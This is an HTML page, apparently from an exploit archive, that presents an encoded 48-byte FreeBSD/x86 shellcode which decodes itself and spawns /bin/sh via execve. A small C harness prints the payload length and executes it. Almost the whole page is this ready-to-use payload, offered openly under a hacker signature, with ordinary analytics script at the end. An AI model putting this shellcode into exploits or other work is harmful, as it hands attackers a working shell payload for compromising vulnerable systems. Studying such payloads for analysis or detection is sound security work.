<html><head><title>FreeBSD/x86 - encrypted shellcode /bin/sh 48 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*

Encoded SUB shellcode execve /bin/sh of 48 bytes
by anderson_underground@hotmail.com &lt;c0d3_z3r0&gt;

Hack 'n Roll

*/


char shellcode[] =
&quot;\x31\xd2&quot;
&quot;\xeb\x0e&quot;
&quot;\x31\xdb&quot;
&quot;\x5b&quot;
&quot;\xb1\x19&quot;
&quot;\x83\x2c\x1a\x01&quot;
&quot;\x42&quot;
&quot;\xe2\xf9&quot;
&quot;\xeb\x05&quot;
&quot;\xe8\xed\xff\xff\xff&quot;
&quot;\x32\xc1&quot;
&quot;\x51&quot;
&quot;\x69\x30\x30\x74\x69\x69&quot;
&quot;\x30\x63\x6a&quot;
&quot;\x6f&quot;
&quot;\x32\xdc&quot;
&quot;\x8a\xe4&quot;
&quot;\x51&quot;
&quot;\x55&quot;
&quot;\x54&quot;
&quot;\x51&quot;
&quot;\xb1\x3c&quot;
&quot;\xce&quot;
&quot;\x81&quot;;


main(){
printf(&quot;Length: %d\n&quot;,strlen(shellcode));
asm(&quot;call shellcode&quot;);
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
